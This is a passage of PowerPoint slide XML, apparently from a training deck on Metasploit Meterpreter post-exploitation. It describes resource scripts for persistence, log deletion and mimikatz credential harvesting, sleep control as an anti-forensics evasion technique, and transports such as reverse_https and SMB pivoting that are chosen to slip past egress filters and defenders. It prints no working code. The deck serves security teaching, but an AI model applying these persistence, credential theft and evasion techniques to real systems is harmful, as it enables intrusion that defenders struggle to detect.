            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Common Use Cases for Resource Scripts</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Enumeration Packs:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> A script that automatically runs </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>sysinfo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>enum_users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>arp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>, and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>getprivs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> to quickly assess the environment.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Post-Exploitation Persistence:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> A script that installs a backdoor, adds a registry key, and sets up a scheduled task to ensure the connection survives a reboot.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Environment Cleanup:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> A script that removes temporary files, deletes logs (where authorized), and terminates unauthorized processes before closing the connection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Credential Harvesting:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> A script that dumps memory and attempts to extract hashes using available modules like </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0" err="1"/>
              <a:t>mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (Kiwi).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="33245619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D2012-B56A-A8E0-2DD2-A87B57FB2BCF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Timeout Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Sleep Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> in Meterpreter</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7691042C-4BD8-CEF2-83CB-C17519EAD401}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Understanding the differences between </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Timeout Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Sleep Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> in Meterpreter is essential for managing session persistence, stealth, and operational security during post-exploitation activities.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>While both mechanisms influence how a Meterpreter session interacts with the network, they serve fundamentally different purposes: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Timeout Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> manages the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" i="1" dirty="0"/>
              <a:t>lifespan and reliability</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> of the connection, whereas </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Sleep Control</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> is an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" i="1" dirty="0"/>
              <a:t>active anti-forensics technique</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> used to minimize the "noise" of the session.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3730324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EF069-F93D-A225-00AD-0D342413C1DD}"/>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D72251D2-CE1B-457E-63E3-E714645A1273}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{84FAFE1D-7D24-457E-8B78-5B1DA9A4D37F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1416244468"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="628650" y="2803398"/>
          <a:ext cx="7886700" cy="2986789"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" firstCol="1" bandRow="1">
                <a:tableStyleId>{D3BA4600-CF29-4966-8986-3B1AA4679568}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="2628900">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1190530084"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2628900">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="1359495314"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="2628900">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2196978864"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
              </a:tblGrid>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Feature</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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b="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Timeout Control</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Sleep Control</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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2024155319"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Primary Purpose</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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Defines session limits and reconnection behavior.</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Temporarily silences the session to evade detection.</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806253716"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Network Impact</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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Maintains connectivity; attempts reconnection if dropped.</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Completely kills the connection for a set duration.</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475218924"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Visibility</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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Keeps the session "alive" to the framework.</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Makes the session appear "dead" to the framework.</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848634411"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Configurable</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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Persistent settings (via set_timeouts).</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One-off command (via sleep &lt;seconds&gt;).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228498860"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="0">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr>
                        <a:lnSpc>
                          <a:spcPct val="107000"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-IN" sz="1200" b="1" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Goal</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-IN" sz="1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Session stability and longevity.</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dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Noise reduction and traffic obfuscation.</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542334637"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31499942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185A0-CE5C-6A50-F530-EFDD500C39CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Meterpreter transports</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{63BF2E24-4F53-D4F1-0487-D8D38509B534}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Meterpreter transports</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> are the underlying communication mechanisms that allow the payload to talk back to your Metasploit handler. Think of the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>transport</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> as the "vehicle" the data uses to travel, while </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>timeouts</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>sleep settings</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> (which we previously discussed) are the "scheduling" for that vehicle.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="25466779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D866D93-83E7-E609-4248-212AFD3E0312}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="520495" y="932469"/>
            <a:ext cx="7886700" cy="5615815"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="32500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Core Meterpreter Transports</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Meterpreter supports several transport types, each designed for different network conditions and evasion requirements.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>1. TCP (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>bind_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>How it works:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> A standard, raw TCP connection. It is the fastest and most reliable transport.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Pros:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Minimal overhead; high speed; very stable.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Cons:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Highly visible to network security appliances (IDS/IPS). Since it is raw traffic, modern firewalls often flag it as anomalous, especially if not encrypted with TLS.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>2. HTTP (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>reverse_http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>How it works:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Mimics standard web traffic. The payload sends GET/POST requests to the listener, and the listener returns instructions.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Pros:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Looks like standard web browsing traffic, allowing it to blend in with legitimate traffic. Can often bypass egress filters that only allow port 80.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Cons:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Less efficient than TCP due to the overhead of HTTP headers.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>3. HTTPS (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>reverse_https</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>How it works:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Similar to HTTP, but wraps the traffic in TLS encryption.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Pros:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>The industry standard for post-exploitation.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Because the payload is encrypted, network defenders cannot see the content of your commands. It appears as standard encrypted HTTPS traffic (e.g., to a bank or cloud service).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Cons:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> High overhead due to encryption/decryption; requires a valid SSL certificate (or a self-signed one) to avoid raising "bad cert" flags in SSL inspection environments.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>4. SMB (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0" err="1"/>
              <a:t>bind_pipe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>) – Server Message Block</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>How it works:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Operates over Named Pipes via the SMB protocol (port 445).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Pros:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Extremely effective in internal network environments. If you have compromised a machine, you can "pivot" using SMB to reach other hosts that are not directly exposed to the internet. Since SMB is essential for Windows internal operations, this traffic is often heavily trusted within the internal network.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Cons:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> Restricted to local network communication; it cannot traverse the internet directly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Dynamic Transport Switching</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="114300" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>One of Meterpreter's most powerful features is its ability to change transports </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" i="1" dirty="0"/>
              <a:t>on the fly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> without having to re-infect the machine.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>How it works:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> You can configure a session with multiple "transport URLs." If the current transport (e.g., HTTP) is blocked or becomes unstable, Meterpreter can automatically switch to a secondary transport (e.g., HTTPS or SMB) based on your pre-configured settings.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="114300" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" b="1" dirty="0"/>
              <a:t>Why it matters:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t> This provides massive resiliency. If a defender blocks port 80, your session can "fail over" to port 443 or shift to an internal SMB pivot, keeping your access alive.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="30628419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4B1A3-01A9-93AA-4E98-2FCEC2E4407F}"/>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EFF3EBB-A15C-D393-F770-7EC70BF9A3A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="4" name="Table 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B58EB5EE-9316-502C-4C0C-0573DEFA8E8B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="49986479"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="628650" y="3068701"/>
          <a:ext cx="7886700" cy="2456373"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr firstRow="1" firstCol="1" bandRow="1">
                <a:tableStyleId>{D3BA4600-CF29-4966-8986-3B1AA4679568}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="1971675">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3888712296"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="1971675">
                  <a:extLst>
